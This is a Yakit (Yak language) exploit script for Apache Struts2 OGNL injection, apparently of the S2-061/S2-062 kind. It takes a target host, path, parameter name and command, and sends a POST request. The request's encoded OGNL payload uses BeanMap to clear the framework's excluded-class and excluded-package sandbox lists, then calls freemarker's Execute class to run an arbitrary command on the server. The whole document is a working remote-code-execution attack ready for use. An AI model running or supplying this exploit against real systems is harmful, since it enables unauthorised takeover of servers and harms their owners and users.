yakit.AutoInitYakit()
log.setLevel("info")

target = cli.String("target")
cmd = cli.String("cmd")
path = cli.String("path")
id = cli.String("id")

yakit.Info("[+]开始利用")

sendPacket = func (target,cmd,path,id){
    return poc.HTTP(`
POST {{params(path)}} HTTP/1.1
Host: {{params(target)}}
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

{{params(id)}}=(%23request.map%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
(%23request.map.setBean(%23request.get('struts.valueStack'))+%3d%3d+true).toString().substring(0,0)+%2b
(%23request.map2%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
(%23request.map2.setBean(%23request.get('map').get('context'))+%3d%3d+true).toString().substring(0,0)+%2b
(%23request.map3%3d%23%40org.apache.commons.collections.BeanMap%40{}).toString().substring(0,0)+%2b
(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))+%3d%3d+true).toString().substring(0,0)+%2b
(%23request.get('map3').put('excludedPackageNames',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b
(%23request.get('map3').put('excludedClasses',%23%40org.apache.commons.collections.BeanMap%40{}.keySet())+%3d%3d+true).toString().substring(0,0)+%2b
(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'{{url({{params(cmd)}})}}'}))
`,
        poc.params({
            "target": target,
            "cmd": cmd,
            "path": path,
            "id": id,
        }),
    )
}

res, req, err = sendPacket(target,cmd,path,id)
yakit.Info("[+]执行的命令为："+cmd)
yakit.Info(string(err))